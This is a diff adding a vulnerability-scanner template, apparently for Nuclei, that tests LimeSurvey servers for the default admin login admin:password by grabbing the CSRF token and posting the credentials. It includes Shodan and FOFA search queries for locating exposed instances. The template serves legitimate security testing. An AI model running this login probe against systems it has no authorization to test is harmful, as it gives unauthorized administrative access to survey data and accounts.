@@ -1,0 +1,64 @@
+id: limesurvey-default-admin-password-risk
+
+info:
+  name: LimeSurvey 默认管理员口令风险
+  author: 0x_Akoko
+  severity: high
+  description: |
+    检测到 LimeSurvey 调查管理平台使用了默认管理员凭据（admin:password）。攻击者可借此获取完全管理权限，进而操控调查问卷、应答数据及用户账户。
+  reference:
+    - https://github.com/LimeSurvey/LimeSurvey/blob/master/application/config/config-defaults.php
+    - https://www.limesurvey.org/manual/Optional_settings
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: limesurvey
+    product: limesurvey
+    shodan-query: 'http.title:"LimeSurvey"'
+    fofa-query: 'title="LimeSurvey"'
+  tags: LimeSurvey
+  remediation: >-
+    升级受影响产品至最新的厂商支持版本，并安装所有可用的安全补丁。如果暂时无法升级，应限制对受影响端点的访问，尽可能禁用存在风险的功能，并采取身份认证、网络隔离和请求过滤等补偿性措施。同时检查相关 日志，并轮换可能已暴露的凭据或密钥。
+
+variables:
+  username: "admin"
+  password: "password"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /index.php/admin/authentication/sa/login HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: dsl
+        internal: true
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(body, "LimeSurvey", "loginform")'
+        condition: and
+    extractors:
+      - type: regex
+        name: csrf_token
+        part: header
+        group: 1
+        internal: true
+        regex:
+          - 'YII_CSRF_TOKEN=([^;]+)'
+  - raw:
+      - |
+        POST /index.php/admin/authentication/sa/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: YII_CSRF_TOKEN={{csrf_token}}
+
+        user={{username}}&password={{password}}&YII_CSRF_TOKEN={{csrf_token}}&login_submit=login
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 302'
+          - 'contains_any(to_lower(header), "adminsidepanel", "dashboard", "admin/index")'
+        condition: and
+
+# digest: 4a0a0047304502201b747bc58acafb08cfef92ba76ccd7e9e4c7a38a26252056bd2ac8131c9f53a102210092799695e4103a6f9b25b1618c7ce94f63249e78f2e98a108a65db04d78630eb:922c64590222798bb761d5b6d8e72950
